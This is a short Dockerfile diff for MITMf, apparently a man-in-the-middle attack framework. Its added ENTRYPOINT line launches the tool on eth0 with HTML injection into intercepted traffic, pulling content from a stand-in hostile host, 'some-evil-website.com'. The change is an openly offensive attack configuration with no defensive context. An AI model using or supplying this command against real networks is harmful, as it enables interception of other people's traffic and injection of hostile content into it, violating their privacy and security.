@@ -11,4 +11,4 @@ RUN pip install -r requirements.txt
 VOLUME /MITMf/logs/
 
 EXPOSE 10000
-ENTRYPOINT ["python", "/MITMf/mitmf.py"]
+ENTRYPOINT ["python", "/MITMf/mitmf.py", "-i", "eth0", "--inject", "--html-url", "http://some-evil-website.com"]
